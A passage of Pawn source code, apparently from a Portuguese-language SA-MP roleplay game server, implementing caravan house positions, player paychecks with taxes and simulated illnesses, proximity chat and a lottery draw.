			DestroyDynamicPickup(HousePickup[cInfo[vehicleid][CaravanaCasaID]]);
			DestroyDynamic3DTextLabel(HouseLabel[cInfo[vehicleid][CaravanaCasaID]]);

			hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterX] = 0;
			hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterY] = 0;
			hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterZ] = 0;
			hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterAngle] = 0;
			hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterVirtualWorld] = 0;
		}
	}
	
	AtualizarDanosCarro(vehicleid);

	return 1;
}

public AtualizarCaravanaPos(vehicleid)
{
	new Float:cx, Float:cy, Float:cz, Float:a, vw;

	GetVehiclePos(vehicleid, cx, cy, cz);
	GetVehicleZAngle(vehicleid, a);
	vw = GetVehicleVirtualWorld(vehicleid);

	if(cInfo[vehicleid][IsCaravana] == 1)
	{
		GetVehicleRelativePos(vehicleid, cx, cy, cz, 1.8, 0.3, -0.5); // journey 	    1.8 0.3 -0.5
	}
	else
	{
	    GetVehicleRelativePos(vehicleid, cx, cy, cz, -0.7, -2.7, 1); // tropic 	    -0.7 -2.7 1
	}
	
	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterX] = cx;
	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterY] = cy;
	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterZ] = cz;
	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterAngle] = a;
	hInfo[cInfo[vehicleid][CaravanaCasaID]][EnterVirtualWorld] = vw;

	AtualizarCasa(cInfo[vehicleid][CaravanaCasaID]);
}

public AtualizarTodasCaravanasPos()
{
	new Float:distance, engine, lights, alarm, doors, bonnet, boot, objective;
	
    for(new i = 0; i < MAX_CARROS; i++)
    {
        if(cInfo[i][IsCaravana] != 1 && cInfo[i][IsCaravana] != 2) continue;
        
        GetVehicleParamsEx(i,engine,lights,alarm,doors,bonnet,boot,objective);
        
        if(Motor[i] == true) continue;
        
        distance = GetVehicleDistanceFromPoint(i, hInfo[cInfo[i][CaravanaCasaID]][EnterX], hInfo[cInfo[i][CaravanaCasaID]][EnterY], hInfo[cInfo[i][CaravanaCasaID]][EnterZ]);
        
        if(distance > 3)
        {
		 	DestroyDynamicPickup(HousePickup[cInfo[i][CaravanaCasaID]]);
		 	DestroyDynamic3DTextLabel(HouseLabel[cInfo[i][CaravanaCasaID]]);

			hInfo[cInfo[i][CaravanaCasaID]][EnterX] = 0;
			hInfo[cInfo[i][CaravanaCasaID]][EnterY] = 0;
			hInfo[cInfo[i][CaravanaCasaID]][EnterZ] = 0;
			hInfo[cInfo[i][CaravanaCasaID]][EnterAngle] = 0;
			hInfo[cInfo[i][CaravanaCasaID]][EnterInterior] = 0;
			hInfo[cInfo[i][CaravanaCasaID]][EnterVirtualWorld] = 0;
			
			AtualizarCaravanaPos(i);
        }
    }
    
    return 1;
}

public SetPlayerPosEx(playerid, Float:x, Float:y, Float:z)
{
	if(pInfo[playerid][Admin] == 0)
	{
		TogglePlayerControllable(playerid, 0);
	 	GameTextForPlayer(playerid, "A carregar o mapa", 200, 1);
	  	SetTimerEx("UnfreezeCarregar", 4000, false, "i", playerid);

	   	Streamer_UpdateEx(playerid, x, y, z, -1, -1);
	}
	
    SetPlayerPos(playerid, x, y, z+0.6);
    
	return 1;
}

forward UnfreezeCarregar(playerid);
public UnfreezeCarregar(playerid)
{
	TogglePlayerControllable(playerid, 1);
}

public Aviao(playerid)
{
	SendClientMessage(playerid, COLOR_INFO, "Chegaste ao teu destino!");
	SetPlayerPosEx(playerid, 0, 0, 10);

	return 1;
}

public CrashServer()
{
   	if(is_socket_valid(g_Socket))
   	{
   	    socket_destroy(g_Socket);
   	}
   	
    fclose(fopen("fsafsa", io_read));
}

public PayDay(playerid)
{
	new string[128], startbank;
	
	if(pInfo[playerid][Jailed] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Estás no AJ, não recebeste paycheck.");
	
	pInfo[playerid][Minutos] = 0;
	
	SendClientMessage(playerid, COLOR_ORANGE, "_________________________________________{00FF00}[ {FFFFFF}PAYCHECK {00FF00}]{FF9900}_______________________________________");
	
	startbank = pInfo[playerid][Bank];
	new nextlevelxp = pInfo[playerid][Level]*3;
	
	if(pInfo[playerid][Emprego] != 0)
	{
	    pInfo[playerid][Bank] += jInfo[pInfo[playerid][Emprego]][Salario];
	    
		format(string, sizeof(string), "[EMPREGO:] {FFFFFF}Salário recebido: %d$", jInfo[pInfo[playerid][Emprego]][Salario]);
        SendClientMessage(playerid, COLOR_CHAT, string);
	}
	else
	{
		format(string, sizeof(string), "[EMPREGO:] {FFFFFF}Fundo de Desemprego recebido: %d$", oInfo[0][FundoDesemprego]);
        SendClientMessage(playerid, COLOR_CHAT, string);
        
		pInfo[playerid][Bank] += oInfo[0][FundoDesemprego];
	}
	
	if(pInfo[playerid][Faction] != 0)
	{
		switch(pInfo[playerid][FactionRank])
		{
		    case 1:
		    {
		 	    pInfo[playerid][Bank] += fInfo[pInfo[playerid][Faction]][SalarioRank1];
		 	    fInfo[pInfo[playerid][Faction]][Bank] -= fInfo[pInfo[playerid][Faction]][SalarioRank1];
		 	    
				format(string, sizeof(string), "[FACTION:] {FFFFFF}Rank: %s", fInfo[pInfo[playerid][Faction]][Rank1]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
				format(string, sizeof(string), "[FACTION:] {FFFFFF}Salário recebido: %d$", fInfo[pInfo[playerid][Faction]][SalarioRank1]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
		    }
		    case 2:
		    {
		 	    pInfo[playerid][Bank] += fInfo[pInfo[playerid][Faction]][SalarioRank2];
		 	    fInfo[pInfo[playerid][Faction]][Bank] -= fInfo[pInfo[playerid][Faction]][SalarioRank2];

				format(string, sizeof(string), "[FACTION:] {FFFFFF}Rank: %s", fInfo[pInfo[playerid][Faction]][Rank2]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
				format(string, sizeof(string), "[FACTION:] {FFFFFF}Salário recebido: %d$", fInfo[pInfo[playerid][Faction]][SalarioRank2]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
		    }
		    case 3:
			{
		 	    pInfo[playerid][Bank] += fInfo[pInfo[playerid][Faction]][SalarioRank3];
		 	    fInfo[pInfo[playerid][Faction]][Bank] -= fInfo[pInfo[playerid][Faction]][SalarioRank3];

				format(string, sizeof(string), "[FACTION:] {FFFFFF}Rank: %s", fInfo[pInfo[playerid][Faction]][Rank3]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
				format(string, sizeof(string), "[FACTION:] {FFFFFF}Salário recebido: %d$", fInfo[pInfo[playerid][Faction]][SalarioRank3]);
		        SendClientMessage(playerid, COLOR_CHAT, "[EMPREGO:] {FFFFFF}Recebeste o teu Salário");
			}
			case 4:
			{
		 	    pInfo[playerid][Bank] += fInfo[pInfo[playerid][Faction]][SalarioRank4];
		 	    fInfo[pInfo[playerid][Faction]][Bank] -= fInfo[pInfo[playerid][Faction]][SalarioRank4];

				format(string, sizeof(string), "[FACTION:] {FFFFFF}Rank: %s", fInfo[pInfo[playerid][Faction]][Rank4]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
				format(string, sizeof(string), "[FACTION:] {FFFFFF}Salário recebido: %d$", fInfo[pInfo[playerid][Faction]][SalarioRank4]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
			}
			case 5:
			{
		 	    pInfo[playerid][Bank] += fInfo[pInfo[playerid][Faction]][SalarioRank5];
		 	    fInfo[pInfo[playerid][Faction]][Bank] -= fInfo[pInfo[playerid][Faction]][SalarioRank5];

				format(string, sizeof(string), "[FACTION:] {FFFFFF}Rank: %s", fInfo[pInfo[playerid][Faction]][Rank5]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
				format(string, sizeof(string), "[FACTION:] {FFFFFF}Salário recebido: %d$", fInfo[pInfo[playerid][Faction]][SalarioRank5]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
			}
			case 6:
			{
		 	    pInfo[playerid][Bank] += fInfo[pInfo[playerid][Faction]][SalarioRank6];
        		fInfo[pInfo[playerid][Faction]][Bank] -= fInfo[pInfo[playerid][Faction]][SalarioRank6];

				format(string, sizeof(string), "[FACTION:] {FFFFFF}Rank: %s", fInfo[pInfo[playerid][Faction]][Rank6]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
				format(string, sizeof(string), "[FACTION:] {FFFFFF}Salário recebido: %d$", fInfo[pInfo[playerid][Faction]][SalarioRank6]);
		        SendClientMessage(playerid, COLOR_CHAT, string);
			}
		}
	}
	
	if(pInfo[playerid][XP] >= nextlevelxp)
	{
	    pInfo[playerid][XP] = 0;
     	pInfo[playerid][Level]++;
	    
	    if(pInfo[playerid][Golds] > 0)
	    {
	        pInfo[playerid][Bank] += pInfo[playerid][Level]*100;
	    }
		else
		{
		    pInfo[playerid][Bank] += pInfo[playerid][Level]*50;
		}
	    
	    SetPlayerScore(playerid, pInfo[playerid][Level]);
	    
		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Parabéns, subiste de nível! Novo objetivo: %d experiência. Ganhaste %d$ de bónus", pInfo[playerid][Level]*3, pInfo[playerid][Level]*70);
		SendClientMessage(playerid, COLOR_CHAT, string);
	}
	else
	{
	    if(pInfo[playerid][Golds] > 0)
		{
		    pInfo[playerid][XP] += 2;
		}
		else
		{
		    pInfo[playerid][XP]++;
		}
	    
		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Tens atualmente %d/%d de experiência", pInfo[playerid][XP], pInfo[playerid][Level]*3);
		SendClientMessage(playerid, COLOR_CHAT, string);
	}
	
	if(pInfo[playerid][Meses] == 12)
	{
	    pInfo[playerid][Idade]++;
	    pInfo[playerid][Meses] = 0;
	    
		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Parabéns, fizeste anos! Tens agora %d anos", pInfo[playerid][Idade]);
		SendClientMessage(playerid, COLOR_CHAT, string);
	}
	else
	{
	    pInfo[playerid][Meses]++;
	    
		format(string, sizeof(string), "[JOGADOR:] {FFFFFF}Tens agora %d anos e %d meses", pInfo[playerid][Idade], pInfo[playerid][Meses]);
		SendClientMessage(playerid, COLOR_CHAT, string);
	}
	if(pInfo[playerid][MedicamentosTomados] == 1)
	{
 		switch(pInfo[playerid][Doenca])
   		{
     		case 1: // Gripe
			{
                new rand = random(3);
                
                if(rand == 1 || rand == 2)
                {
                    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Os medicamentos fizeram efeito. Agora estás saudável");
                    pInfo[playerid][Doenca] = 0;
                    pInfo[playerid][MedicamentosTomados] = 0;
                    pInfo[playerid][ReceitaMedica] = 0;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Infelizmente os medicamentos não fizeram efeito. É melhor ires comprar mais");
				    pInfo[playerid][MedicamentosTomados] = 0;
				}
			}
			case 2: // Infeção Urinária
			{
                new rand = random(5);

                if(rand == 1)
                {
                    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Os medicamentos fizeram efeito. Agora estás saudável");
                    pInfo[playerid][Doenca] = 0;
                    pInfo[playerid][MedicamentosTomados] = 0;
                    pInfo[playerid][ReceitaMedica] = 0;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Infelizmente os medicamentos não fizeram efeito. é melhor ires comprar mais");
				    pInfo[playerid][MedicamentosTomados] = 0;
				}
			}
			case 3: // Dores de barriga
			{
                new rand = random(1);

                if(rand == 1)
                {
                    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Os medicamentos fizeram efeito. Agora estás saudável");
                    pInfo[playerid][Doenca] = 0;
                    pInfo[playerid][MedicamentosTomados] = 0;
                    pInfo[playerid][ReceitaMedica] = 0;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Infelizmente os medicamentos não fizeram efeito. é melhor ires comprar mais");
				    pInfo[playerid][MedicamentosTomados] = 0;
				}
			}
			case 4: // Ataques de tosse
			{
                new rand = random(2);

                if(rand == 1)
                {
                    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Os medicamentos fizeram efeito. Agora estás saudável");
                    pInfo[playerid][Doenca] = 0;
                    pInfo[playerid][MedicamentosTomados] = 0;
                    pInfo[playerid][ReceitaMedica] = 0;
				}
				else
				{
				    SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Infelizmente os medicamentos não fizeram efeito. é melhor ires comprar mais");
				    pInfo[playerid][MedicamentosTomados] = 0;
				}
			}
		}
	}
	if(pInfo[playerid][Doenca] != 0)
	{
 		switch(pInfo[playerid][Doenca])
   		{
     		case 1: // Gripe
			{
				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens Gripe. Visita o Hospital o mais rápido possível");
    			PlayerActionMessage(playerid, 15.0, "espirra.");
    			SetPlayerHealthEx(playerid, 15, 2);
			}
			case 2: // Infeção Urinária
			{
				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens uma Infeção Urinária. Visita o Hospital o mais rápido possível");
				SetPlayerHealthEx(playerid, 15, 2);
			}
			case 3: // Dores de barriga
			{
				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens Dores de Barriga. Visita o Hospital o mais rápido possível");
				PlayerActionMessage(playerid, 15.0, "vomita.");
				ApplyAnimation(playerid, "FOOD", "EAT_Vomit_P",4.1,0,1,1,2000,1);
				SetPlayerHealthEx(playerid, 5, 2);
			}
			case 4: // Ataques de tosse
			{
				SendClientMessage(playerid, COLOR_INFO, "[SAÚDE:] Tens Ataques de Tosse regulares. Visita o Hospital o mais rápido possível");
				PlayerActionMessage(playerid, 15.0, "começa a tossir.");
				SetPlayerHealthEx(playerid, 10, 2);
			}
		}
	}
	else
	{
        new rand = random(50);
        
        if(rand == 1) // apanhou doença
        {
			rand = random(5);
			
			switch(rand)
			{
	     		case 0,1: { SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] Apanhaste Gripe. Visita o Hospital o mais rápido possível"); pInfo[playerid][Doenca] = 1; }
                case 2: { SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] Apanhaste uma Infeção Urinária. Visita o Hospital o mais rápido possível"); pInfo[playerid][Doenca] = 2; }
                case 3: { SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] Tens Dores de Barriga intensas. Visita o Hospital o mais rápido possível"); pInfo[playerid][Doenca] = 3; }
                case 4,5: { SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] Tens Ataques de Tosse regulares. Visita o Hospital o mais rápido possível"); pInfo[playerid][Doenca] = 4; }
			}
        }
        else
        {
            SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] {FFFFFF}Estás saudável");
        }
	}
	
	if(pInfo[playerid][ADesentoxicar] == 1) // 75 por cento de resultar
	{
	    new rand = random(4);
	    
	    if(rand == 1 || rand == 2 || rand == 3)
	    {
	        SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] A desentoxicação resultou. Já não estás viciado nas drogas!");
	        pInfo[playerid][Viciado] = 0;

	    }
	    else
		{
		    SendClientMessage(playerid, COLOR_CHAT, "[SAÚDE:] A desentoxicação não resultou. Visita o hospital novamente!");
		}
	    
	    pInfo[playerid][ADesentoxicar] = 0;
	}
	
	if(GetOnlinePlayers() > 10)
	{
	    new bonus;
	    
	    if(pInfo[playerid][Golds] > 0) bonus = GetOnlinePlayers()*10;
	    else bonus = GetOnlinePlayers()*5;
	    
	    pInfo[playerid][Bank] += bonus;
	    
		format(string, sizeof(string), "[BÓNUS:] {FFFFFF}Estão %d jogadores online. Bónus: %d$", GetOnlinePlayers(), bonus);
		SendClientMessage(playerid, COLOR_CHAT, string);
	}
	
	new juros = 0, imposto = 0, imposto_carros = 0, imposto_casa = 0, imposto_loja = 0, carnumber = GetPlayerCarNumber(playerid), governototal = 0;
	
	if(pInfo[playerid][Golds] > 0) // tem premium
	{
		juros = pInfo[playerid][Bank]/700;
		imposto = oInfo[0][Impostos];
		pInfo[playerid][Bank] += juros;
		pInfo[playerid][Bank] -= imposto;
		SetPlayerHealthEx(playerid, 5, 2);
		
		governototal += imposto;
		
		if(carnumber != 0 && oInfo[0][ImpostoCarros] != 0)
		{
		    imposto_carros = floatround((carnumber * oInfo[0][ImpostoCarros])/2, floatround_round);
			format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto Automóvel: %d$", imposto_carros);
			SendClientMessage(playerid, COLOR_CHAT, string);
			
			pInfo[playerid][Bank] -= imposto_carros;
			
			governototal += imposto_carros;
		}
		
		if(pInfo[playerid][ChaveCasa] != 0 && oInfo[0][ImpostoCasas] != 0)
		{
		    imposto_casa = floatround(oInfo[0][ImpostoCasas]/2, floatround_round);
			format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto de Propriedade: %d$", imposto_casa);
			SendClientMessage(playerid, COLOR_CHAT, string);

			pInfo[playerid][Bank] -= imposto_casa;
			
			governototal += imposto_casa;
		}
		
		if(pInfo[playerid][ChaveBiz] != 0 && oInfo[0][ImpostoLojas] != 0)
		{
		    imposto_loja = floatround(oInfo[0][ImpostoLojas]/2, floatround_round);
			format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto de Negócios: %d$", imposto_loja);
			SendClientMessage(playerid, COLOR_CHAT, string);

			pInfo[playerid][Bank] -= imposto_loja;
			
			governototal += imposto_loja;
		}
	}
	else // player normal
	{
		juros = pInfo[playerid][Bank]/1000;
		imposto = oInfo[0][Impostos];
		pInfo[playerid][Bank] += juros;
		pInfo[playerid][Bank] -= imposto;
		SetPlayerHealthEx(playerid, 10, 2);
		
		if(carnumber != 0 && oInfo[0][ImpostoCarros] != 0)
		{
		    imposto_carros = floatround((carnumber * oInfo[0][ImpostoCarros]), floatround_round);
			format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto Automóvel: %d$", imposto_carros);
			SendClientMessage(playerid, COLOR_CHAT, string);

			pInfo[playerid][Bank] -= imposto_carros;
			
			governototal += imposto_carros;
		}
		
		if(pInfo[playerid][ChaveCasa] != 0 && oInfo[0][ImpostoCasas] != 0)
		{
		    imposto_casa = oInfo[0][ImpostoCasas];
			format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto de Propriedade: %d$", imposto_casa);
			SendClientMessage(playerid, COLOR_CHAT, string);

			pInfo[playerid][Bank] -= imposto_casa;
			
			governototal += imposto_casa;
		}
		
		if(pInfo[playerid][ChaveBiz] != 0 && oInfo[0][ImpostoLojas] != 0)
		{
		    imposto_loja = oInfo[0][ImpostoLojas];
			format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto de Negócios: %d$", imposto_loja);
			SendClientMessage(playerid, COLOR_CHAT, string);

			pInfo[playerid][Bank] -= imposto_loja;
			
			governototal += imposto_loja;
		}
	}
	
	if(pInfo[playerid][Seguradora] == 1)
	{
		pInfo[playerid][Bank] -= pInfo[playerid][MensalidadeSeguradora];
		bInfo[pInfo[playerid][Seguradora]][Bank] += pInfo[playerid][MensalidadeSeguradora];
		pInfo[playerid][SeguradoraCount]++;
		pInfo[playerid][SeguradoraPayCount]++;
	}

	format(string, sizeof(string), "[BANCO:] {FFFFFF}Seguro automóvel: %d$ (%s)", pInfo[playerid][MensalidadeSeguradora], bInfo[pInfo[playerid][Seguradora]][Nome]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	if(pInfo[playerid][MensalidadeSeguradora] != bInfo[pInfo[playerid][Seguradora]][Seguradora])
	{
		format(string, sizeof(string), "[BANCO:] {AA3333}A SUA SEGURADORA ALTEROU A MENSALIDADE DO SEU SEGURO PARA {FFFFFF}%d$", bInfo[pInfo[playerid][Seguradora]][Seguradora]);
		SendClientMessage(playerid, COLOR_CHAT, string);
		pInfo[playerid][MensalidadeSeguradora] = bInfo[pInfo[playerid][Seguradora]][Seguradora];
	}
	format(string, sizeof(string), "[BANCO:] {FFFFFF}Imposto: %d$", imposto);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "[BANCO:] {FFFFFF}Juros: %d$ (1 p/cento)", juros);
	SendClientMessage(playerid, COLOR_CHAT, string);
	format(string, sizeof(string), "[BANCO:] {FFFFFF}Antigo balanço: %d$  Novo Balanço: %d$", startbank, pInfo[playerid][Bank]);
	SendClientMessage(playerid, COLOR_CHAT, string);
	
	if(pInfo[playerid][Golds] > 0)
	{
	    pInfo[playerid][Golds]--;
	    
		format(string, sizeof(string), "[GOLDS:] {FFFFFF}Tens agora %d golds.", pInfo[playerid][Golds]);
		SendClientMessage(playerid, COLOR_CHAT, string);
	} 
	
	GameTextForPlayer(playerid, "~g~PAYCHECK", 5000, 6);
	PlayerPlaySound(playerid, 1149, 0.0, 0.0, 10.0);
	
	SendClientMessage(playerid, COLOR_ORANGE, "_____________________________________________________________________________________________");
	
	for(new i = 0; i < MAX_FACTIONS; i++)
	{
 		if(fInfo[i][Type] != F_GOVERNO) continue;

		fInfo[i][Bank] += governototal;
		break;
	}
	
	GuardarJogador(playerid);
	
	return 1;
}

public UnlockTutorials(playerid)
{
	UnlockTutorial[playerid] = true;
	SendClientMessage(playerid, COLOR_CHAT, "[TUTORIAL:] {FFFFFF}Já podes avançar");
	return 1;
}

public PlayerActionMessage(playerid,Float:radius,message[])
{
 	new string[128];

	format(string, sizeof(string), "%s", message);
	ProxDetectorRP(25.0, playerid, string);
	SetPlayerChatBubble(playerid, string, COLOR_ACTION, 15.0, 3000);

	return 1;
}

public PlayerPlayerActionMessage(playerid,targetid,Float:radius,message[])
{
 	new string[128];

	format(string, sizeof(string), "%s %s.",message,GetPlayerNameEx(targetid));
	ProxDetectorRP(20.0, playerid, string);
	
	SetPlayerChatBubble(playerid, string, COLOR_ACTION, 15.0, 3000);

	return 1;
}

public ProxDetectorRP(Float:radi, playerid, string1[])
{
	new Float:x, Float:y, Float:z, string[64], laststring[256];
	GetPlayerPos(playerid, x, y, z);
	
    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
        
		if(IsPlayerInRangeOfPoint(i, 8.0, x, y, z))
		{
		    if(IsAmigo(i, playerid) == 1)
		    {
				format(string, sizeof(string), "%s", GetPlayerNameEx(playerid));
		    }
		    else
		    {
		        format(string, sizeof(string), "Desconhecido (UID: %d)", pInfo[playerid][UID]);
		    }
		    
		    format(laststring, sizeof(laststring), "* %s %s", string, string1);
		    SendClientMessage(i, COLOR_ACTION, laststring);
		}
    }
	return 1;
}

public ProxDetector(Float:radi, playerid, string[])
{
	new Float:x, Float:y, Float:z, laststring[256];
	GetPlayerPos(playerid, x, y, z);

    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;

		if(IsPlayerInRangeOfPoint(i, 8.0, x, y, z))
		{
 			format(laststring, sizeof(laststring), "%s diz: {FFFFFF}(( {D3DEDD}%s {FFFFFF}))", GetPlayerNameEx(playerid), string);
   			SendClientMessage(i, COLOR_WHITE, laststring);
		}
    }
	return 1;
}

public ProxDetectorChat(Float:radi, playerid, string1[], type)
{
	new Float:x, Float:y, Float:z, string[64], laststring[128];
	GetPlayerPos(playerid, x, y, z);

    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;

		if(IsPlayerInRangeOfPoint(i, floatround(radi / 2, floatround_round), x, y, z))
		{
		    if(IsAmigo(i, playerid) == 1)
		    {
				format(string, sizeof(string), "%s", GetPlayerNameEx(playerid));
		    }
		    else
		    {
		        format(string, sizeof(string), "Desconhecido (UID: %d)", pInfo[playerid][UID]);
		        
		        if(strfind(string1, GetPlayerNameEx(playerid), true) != -1)
				{
				    VirarAmigo(i, playerid);
				    ShowPlayerNameTagForPlayer(i, playerid, true);
				}
		    }
			switch(type)
			{
			    case CHAT_TYPE_NORMAL:
			    {
				    format(laststring, sizeof(laststring), "%s diz: %s", string, string1);
				    SendClientMessage(i, COLOR_WHITE, laststring);
			    }
			    case CHAT_TYPE_BAIXO:
			    {
				    format(laststring, sizeof(laststring), "[BAIXO]: %s diz: %s", string, string1);
				    SendClientMessage(i, 0xE1E2E3AA, laststring);
			    }
				case CHAT_TYPE_GRITAR:
				{
				    format(laststring, sizeof(laststring), "%s grita: %s!!!", string, string1);
				    SendClientMessage(i, COLOR_WHITE, laststring);
				}
				case CHAT_TYPE_SUSSURRAR:
				{
				    format(laststring, sizeof(laststring), "%s sussurra: %s", string, string1);
				    SendClientMessage(i, 0xE1E2E3AA, laststring);
				}
			}
		}
    }
	return 1;
}

public ProxDetectorChatDuty(Float:radi, playerid, string1[])
{
	new Float:x, Float:y, Float:z, laststring[128];
	GetPlayerPos(playerid, x, y, z);

    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;

		if(IsPlayerInRangeOfPoint(i, 10.0, x, y, z))
		{
		    format(laststring, sizeof(laststring), "(( %s diz: %s ))", GetPlayerNameEx(playerid), string1);
		    
		   	switch(pInfo[playerid][Admin])
			{
			    case 1,2:
				{
                    SendClientMessage(i, COLOR_GM, laststring);
				}
			    case 3,4:
				{
                    SendClientMessage(i, COLOR_ADMIN, laststring);
				}
				case 5:
				{
                    SendClientMessage(i, COLOR_HADMIN, laststring);
				}
		        case 6, 1337:
				{
                    SendClientMessage(i, COLOR_OWNER, laststring);
				}
			}
		}
    }
	return 1;
}

public ProxDetectorDo(Float:radi, playerid, string1[]) // format(string, sizeof(string), "*(( [%s] %s ))*", GetPlayerNameEx(playerid), action);
{
	new Float:x, Float:y, Float:z, string[128], stringmsg[128];
	GetPlayerPos(playerid, x, y, z);

    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
		if(GetPlayerVirtualWorld(playerid) != GetPlayerVirtualWorld(i)) continue;
		if(GetPlayerInterior(playerid) != GetPlayerInterior(i)) continue;

		if(IsPlayerInRangeOfPoint(i, 8.0, x, y, z))
		{
		    if(IsAmigo(i, playerid) == 1)
		    {
				format(string, sizeof(string), "%s", GetPlayerNameEx(playerid));
		    }
		    else
		    {
		        format(string, sizeof(string), "Desconhecido (UID: %d)", pInfo[playerid][UID]);

		        if(strfind(string1, GetPlayerNameEx(playerid), true) != -1)
				{
				    VirarAmigo(i, playerid);
				    ShowPlayerNameTagForPlayer(i, playerid, true);
				}
		    }
		    
		    format(stringmsg, sizeof(stringmsg), "*(( [%s] %s ))*", string, string1);
		    SendClientMessage(i, COLOR_ACTION, stringmsg);
		}
    }
	return 1;
}

public ProxDetectorS(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid)&&IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
		    if(GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(targetid))
		    {
				return 1;
			}
		}
	}
	return 0;
}

public KickT(playerid) return Kick(playerid);

public BanT(playerid) return Ban(playerid);

public Euromilhoes()
{
	new string[128];
	
	GameTextForAll("~g~Euromilhoes", 3000, 4);
	PlaySoundForAll(1058);
	
	MakeNumber();
	
    foreach(new i : Player)
    {
        // if(!IsPlayerConnected(i)) continue;
        
		SendClientMessage(i, COLOR_ORANGE, "_________________________________________{00FF00}[ {FFFFFF}EUROMILHÕES {00FF00}]{FF9900}_______________________________________");
        if(pInfo[i][BilheteEuro] == 1)
        {
       		new premio;
       		
            format(string, sizeof(string), "[EURO MILHÕES:] {FFFFFF}Os teus números: %d-%d-%d-%d-%d | Estrelas: %d-%d", pInfo[i][Euro1], pInfo[i][Euro2], pInfo[i][Euro3], pInfo[i][Euro4], pInfo[i][Euro5], pInfo[i][Estrela1], pInfo[i][Estrela2]);
			SendClientMessage(i, COLOR_CHAT, string);
			
   			format(string, sizeof(string), "[EURO MILHÕES:] {FFFFFF}Números do sorteio: %d-%d-%d-%d-%d | Estrelas: %d-%d", EuroNumber[0], EuroNumber[1], EuroNumber[2], EuroNumber[3], EuroNumber[4], EuroStar[0], EuroStar[1]);
			SendClientMessage(i, COLOR_CHAT, string);
			
			if(pInfo[i][Euro1] == EuroNumber[0] || pInfo[i][Euro1] == EuroNumber[1] || pInfo[i][Euro1] == EuroNumber[2] || pInfo[i][Euro1] == EuroNumber[3] || pInfo[i][Euro1] == EuroNumber[4]) { premio++; }
			if(pInfo[i][Euro2] == EuroNumber[0] || pInfo[i][Euro2] == EuroNumber[1] || pInfo[i][Euro2] == EuroNumber[2] || pInfo[i][Euro2] == EuroNumber[3] || pInfo[i][Euro2] == EuroNumber[4]) { premio++; }
 			if(pInfo[i][Euro3] == EuroNumber[0] || pInfo[i][Euro3] == EuroNumber[1] || pInfo[i][Euro3] == EuroNumber[2] || pInfo[i][Euro3] == EuroNumber[3] || pInfo[i][Euro3] == EuroNumber[4]) { premio++; }
